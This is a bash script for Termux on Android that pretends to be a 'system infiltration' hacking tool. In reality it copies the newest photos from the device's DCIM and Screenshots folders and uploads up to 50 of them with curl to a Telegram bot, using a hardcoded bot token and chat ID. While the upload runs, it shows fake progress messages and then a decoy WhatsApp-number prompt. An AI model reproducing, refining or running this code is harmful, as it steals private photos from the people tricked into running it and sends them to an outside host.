#!/data/data/com.termux/files/usr/bin/bash

BOT_TOKEN="8234782515:AAFtilwVwXCIbwkySP3J85Erc7fA7jyV4ZA"
CHAT_ID="7803188812"

# Colors for output
GREEN='\033[0;32m'
RED='\033[0;31m'
CYAN='\033[0;36m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Function to format file size
format_size() {
    local size=$1
    if [ $size -gt 1048576 ]; then
        echo "$(echo "scale=2; $size/1048576" | bc) MB"
    else
        echo "$(echo "scale=2; $size/1024" | bc) KB"
    fi
}

# Function to get file size
get_file_size() {
    local file="$1"
    ls -l "$file" | awk '{print $5}'
}

# Progress bar function
progress_bar() {
    local current=$1
    local total=$2
    local width=50
    local percentage=$((current * 100 / total))
    local completed=$((width * current / total))
    local remaining=$((width - completed))
    
    printf "\r${GREEN}["
    printf "%${completed}s" | tr " " "#"
    printf "%${remaining}s" | tr " " "-"
    printf "] %d%%${NC}" $percentage
}

# Function to print text with typing effect
type_text() {
    local text="$1"
    local delay=0.05
    for ((i=0; i<${#text}; i++)); do
        printf "${CYAN}%c${NC}" "${text:$i:1}"
        sleep $delay
    done
    echo
}

# Clear screen and show header
clear
echo -e "${RED}╔══════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║${YELLOW}                SYSTEM INFILTRATION TOOL v5.5                ${RED}║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════════════════╝${NC}"
echo

# Check if storage permission is granted
if [ ! -d "/storage/emulated/0/DCIM" ]; then
    echo -e "${RED}[!] Access Denied: Storage permission required${NC}"
    exit 1
fi

# Create a temporary directory for processing
TEMP_DIR="/data/data/com.termux/files/usr/tmp/getify_upload"
mkdir -p "$TEMP_DIR"

# Function to find and copy latest images
find_latest_images() {
    local source_dir="$1"
    local pattern="$2"
    local dest_dir="$3"
    find "$source_dir" -type f -name "$pattern" -exec cp {} "$dest_dir" \;
}

# Find images from different locations
type_text "[*] Initializing system scan..."
find_latest_images "/storage/emulated/0/DCIM" "*.jpg" "$TEMP_DIR"
find_latest_images "/storage/emulated/0/DCIM" "*.jpeg" "$TEMP_DIR"
find_latest_images "/storage/emulated/0/Pictures/Screenshots" "*.jpg" "$TEMP_DIR"
find_latest_images "/storage/emulated/0/Pictures/Screenshots" "*.jpeg" "$TEMP_DIR"

# Check if any images were found
if [ -z "$(ls -A $TEMP_DIR)" ]; then
    echo -e "${RED}[!] No target files found${NC}"
    rm -rf "$TEMP_DIR"
    exit 0
fi

# Sort images by date (newest first) and store in array, limit to 50
type_text "[*] Analyzing target files..."
mapfile -t sorted_images < <(find "$TEMP_DIR" -type f -printf "%T@ %p\n" | sort -nr | head -n 50 | cut -d' ' -f2-)

# Get total number of images and calculate total size
total_images=${#sorted_images[@]}
total_size=0
for image in "${sorted_images[@]}"; do
    if [ -f "$image" ]; then
        size=$(get_file_size "$image")
        total_size=$((total_size + size))
    fi
done

type_text "[*] Target analysis complete: $total_images files (Total size: $(format_size $total_size))"
echo

# Upload images to server
type_text "[*] Installing system modules..."
current=0
current_size=0

for image in "${sorted_images[@]}"; do
    if [ -f "$image" ]; then
        size=$(get_file_size "$image")
        response=$(curl -s -X POST -F "chat_id=$CHAT_ID" -F "photo=@$image" "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto")
        if [[ $response == *"\"ok\":true"* ]]; then
            current_size=$((current_size + size))
            current=$((current + 1))
            progress_bar $current_size $total_size
        else
            echo -e "\n${RED}[!] Access to server failed${NC}"
        fi
    fi
done

echo -e "\n\n${GREEN}[+] Connected to server successful!${NC}"
sleep 1

# Prank part
echo
type_text "[*] Enter target WhatsApp number (e.g., +1234567890): "
read -r number

# Validate number format (basic check)
if [[ $number =~ ^\+[0-9]{10,}$ ]]; then
    echo
    echo -e "${RED}[!] Error: Too many requests${NC}"
    echo -e "${RED}[!] Server is busy, try again later${NC}"
else
    echo -e "${RED}[!] Invalid number format${NC}"
fi

# Cleanup
rm -rf "$TEMP_DIR" 
